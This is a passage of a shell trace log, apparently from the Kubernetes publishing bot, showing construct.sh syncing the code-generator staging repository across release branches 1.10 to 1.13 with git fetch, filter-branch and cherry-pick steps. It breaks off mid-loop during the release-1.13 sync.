405721ab9678fde04d78961eec9498820d80408d\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\t+ UPSTREAM_HASH=a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8\n>\t+ '[' a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8 '!=' a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.10 at a9df8263ae9febed9f6e3bfd2470c0a5e8be9ce8 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-code-generator-release-1.10.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[17 Nov 18 07:08 UTC]: Successfully constructed release-1.10\n>[17 Nov 18 07:08 UTC]: /publish_scripts/construct.sh code-generator release-1.11 release-1.11   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\t+ UPSTREAM_HASH=3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ '[' 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 '!=' 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.11 at 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-code-generator-release-1.11.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 '!=' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[17 Nov 18 07:09 UTC]: Successfully constructed release-1.11\n>[17 Nov 18 07:09 UTC]: /publish_scripts/construct.sh code-generator release-1.12 release-1.12   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ git checkout -q release-1.12\n>\t+ echo 'Fetching upstream changes.'\n>\tFetching upstream changes.\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6\n>\t+ '[' 4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6 '!=' 4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 4be525c4f59e7d7ef9cf26877c9064f58f6cf6c6 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' 3dcf91f64f638563e5106f21f50c31fa361c918d '!=' 3dcf91f64f638563e5106f21f50c31fa361c918d ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[17 Nov 18 07:09 UTC]: Successfully constructed release-1.12\n>[17 Nov 18 07:09 UTC]: /publish_scripts/construct.sh code-generator release-1.13 release-1.13   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.13\n>\t+ DST_BRANCH=release-1.13\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ git branch -D release-1.13\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.13\n>\tSwitching to origin/release-1.13.\n>\t+ echo 'Switching to origin/release-1.13.'\n>\t+ git branch -f release-1.13 origin/release-1.13\n>\t+ git checkout -q release-1.13\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.13\n>\t+ UPSTREAM_HASH=06b38709c1fbe35daa9e90f67d15ebbc28fcc191\n>\t+ '[' 06b38709c1fbe35daa9e90f67d15ebbc28fcc191 '!=' 6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a ']'\n>\t+ echo 'Upstream branch upstream/release-1.13 moved from '\\''6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a'\\'' to '\\''06b38709c1fbe35daa9e90f67d15ebbc28fcc191'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator release-1.13 release-1.13 '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\tUpstream branch upstream/release-1.13 moved from '6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a' to '06b38709c1fbe35daa9e90f67d15ebbc28fcc191'. We have to sync.\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=release-1.13\n>\t+ local dst_branch=release-1.13\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tcb3d3f4c6fa2e2eeb6a07602786cf678413af380\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.13 commit cb3d3f4c6fa2e2eeb6a07602786cf678413af380.\n>\t+ echo 'Starting at existing release-1.13 commit cb3d3f4c6fa2e2eeb6a07602786cf678413af380.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.13\n>\tBranch upstream-branch set up to track remote branch release-1.13 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 06b38709c1fbe35daa9e90f67d15ebbc28fcc191.\n>\t+ echo 'Checked out source commit 06b38709c1fbe35daa9e90f67d15ebbc28fcc191.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.13\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.13\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>\t+ '[' -z 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 ']'\n>\t++ git-find-merge 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 upstream/release-1.13\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '03aacded1e0e8e9ebf2a84039f02433bb7b38bd0^1..upstream/release-1.13' --first-parent\n>\t+++ git rev-list 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0..upstream/release-1.13 --ancestry-path\n>\t+++ git rev-parse 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>\t+ local k_base_merge=03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>\t+ '[' -z 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 ']'\n>\t+ git branch -f filtered-branch-base 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>\tRewriting upstream branch release-1.13 to only include commits for staging/src/k8s.io/code-generator.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch release-1.13 to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=7dfe599611970bfc03d270201b3e27c6651b17c0\n>\t++ git log --first-parent --format=%H --reverse 7dfe599611970bfc03d270201b3e27c6651b17c0..HEAD\n>\t+ f_mainline_commits='1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t33e14149954cd0f41c26137785ede85dc5db45b3'\n>\t+ echo 'Checking out branch release-1.13.'\n>\t+ git checkout -q release-1.13\n>\tChecking out branch release-1.13.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=cb3d3f4c6fa2e2eeb6a07602786cf678413af380\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=cb3d3f4c6fa2e2eeb6a07602786cf678413af380\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ git show --format=%B -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t++ git-find-merge 493bc79c0432bdb53d87248e18ffcaa5caf9d08d upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '493bc79c0432bdb53d87248e18ffcaa5caf9d08d^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 493bc79c0432bdb53d87248e18ffcaa5caf9d08d..upstream-branch --ancestry-path\n>\t+++ git rev-parse 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t+ k_new_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 = 493bc79c0432bdb53d87248e18ffcaa5caf9d08d ']'\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ is-merge-with-master 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t++ git show --format=short -q 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t+ return 1\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ '[' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ is-merge-with-master 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t++ git show --format=short -q 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>\t+ return 1\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ return 1\n>\t+ is-merge 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ git show --format=short -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ git show --format=short -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ return 1\n>\t++ commit-subject 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ git show --format=%s -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\tCherry-picking k8s.io/kubernetes single-commit 493bc79c0432bdb53d87248e18ffcaa5caf9d08d: update client generator for local timeout.\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 493bc79c0432bdb53d87248e18ffcaa5caf9d08d: update client generator for local timeout.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '1367093c3570ee5ff254b76e873a54d6b7fb83c0^' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 -- Godeps/Godeps.json\n>\t++ commit-date 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t++ git show --format=%aD -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ GIT_COMMITTER_DATE='Fri, 21 Sep 2018 09:11:54 -0400'\n>\t+ git cherry-pick --keep-redundant-commits 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>\t+ squash 1\n>\t++ git rev-parse HEAD\n>\t+ local head=e8427043372d36fe90d4132f46e9ff609a1e447f\n>\t+ git reset -q --soft HEAD~1\n>\t++ committer-date e8427043372d36fe90d4132f46e9ff609a1e447f\n>\t++ git show --format=%cD -q e8427043372d36fe90d4132f46e9ff609a1e447f\n>\t+ GIT_COMMITTER_DATE='Fri, 21 Sep 2018 09:11:54 -0400'\n>\t+ git commit --allow-empty -q -C e8427043372d36fe90d4132f46e9ff609a1e447f\n>\t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 33e14149954cd0f41c26137785ede85dc5db45b3 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git show --format=%B -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t++ git-find-merge 8f7edec615fb9cd722b7f8310dab3efa25351b7c upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '8f7edec615fb9cd722b7f8310dab3efa25351b7c^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 8f7edec615fb9cd722b7f8310dab3efa25351b7c..upstream-branch --ancestry-path\n>\t+++ git rev-parse 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t+ k_new_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 = 8f7edec615fb9cd722b7f8310dab3efa25351b7c ']'\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ is-merge-with-master 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t++ git show --format=short -q 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t+ return 1\n>\t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 '!=' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ k_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ '[' 33e14149954cd0f41c26137785ede85dc5db45b3 = 